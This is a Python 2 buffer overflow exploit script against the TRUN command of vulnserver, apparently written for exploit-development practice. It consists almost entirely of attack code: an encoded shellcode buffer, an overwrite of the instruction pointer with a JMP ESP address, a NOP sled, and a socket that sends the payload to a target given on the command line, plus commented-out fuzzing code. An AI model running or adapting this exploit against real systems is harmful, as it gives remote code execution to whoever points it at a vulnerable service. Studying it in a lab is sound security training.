import sys
import socket

buf =  ""
buf += "\xd9\xc2\xd9\x74\x24\xf4\xbb\x92\xbb\xb8\x7b\x58\x31"
buf += "\xc9\xb1\x31\x83\xe8\xfc\x31\x58\x14\x03\x58\x86\x59"
buf += "\x4d\x87\x4e\x1f\xae\x78\x8e\x40\x26\x9d\xbf\x40\x5c"
buf += "\xd5\xef\x70\x16\xbb\x03\xfa\x7a\x28\x90\x8e\x52\x5f"
buf += "\x11\x24\x85\x6e\xa2\x15\xf5\xf1\x20\x64\x2a\xd2\x19"
buf += "\xa7\x3f\x13\x5e\xda\xb2\x41\x37\x90\x61\x76\x3c\xec"
buf += "\xb9\xfd\x0e\xe0\xb9\xe2\xc6\x03\xeb\xb4\x5d\x5a\x2b"
buf += "\x36\xb2\xd6\x62\x20\xd7\xd3\x3d\xdb\x23\xaf\xbf\x0d"
buf += "\x7a\x50\x13\x70\xb3\xa3\x6d\xb4\x73\x5c\x18\xcc\x80"
buf += "\xe1\x1b\x0b\xfb\x3d\xa9\x88\x5b\xb5\x09\x75\x5a\x1a"
buf += "\xcf\xfe\x50\xd7\x9b\x59\x74\xe6\x48\xd2\x80\x63\x6f"
buf += "\x35\x01\x37\x54\x91\x4a\xe3\xf5\x80\x36\x42\x09\xd2"
buf += "\x99\x3b\xaf\x98\x37\x2f\xc2\xc2\x5d\xae\x50\x79\x13"
buf += "\xb0\x6a\x82\x03\xd9\x5b\x09\xcc\x9e\x63\xd8\xa9\x51"
buf += "\x2e\x41\x9b\xf9\xf7\x13\x9e\x67\x08\xce\xdc\x91\x8b"
buf += "\xfb\x9c\x65\x93\x89\x99\x22\x13\x61\xd3\x3b\xf6\x85"
buf += "\x40\x3b\xd3\xe5\x07\xaf\xbf\xc7\xa2\x57\x25\x18"

ip = sys.argv[1]
port = int(sys.argv[2])

#bad_string = []

#for i in range(2000, 2200, 1):
#	bad_string.append("A" * i)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((ip,port))
banner = s.recv(4096)

try: #E = exploit I = instruction N = NOP P = payload
	cmd = "TRUN ." + "E" * 2006 + "\xAF\x11\x50\x62" + "\x90" * 100 + buf # overwites the instruction pointer \x90 is NOP.  
	# \xAF\x11\x50\x62" is the memory location of JMP esp in vulnserver
	s.send(cmd) 
	s.recv(4096)
#	for bad in bad_string:
#		cmd = "TRUN .%s" % bad
#		s.send(cmd)
#		print "[*] Trying: String of length %i" % len(bad)
#		data = s.recv(4096)
#		print "[*] Received: %s" % data
except:
	print "[!] TANGO DOWN"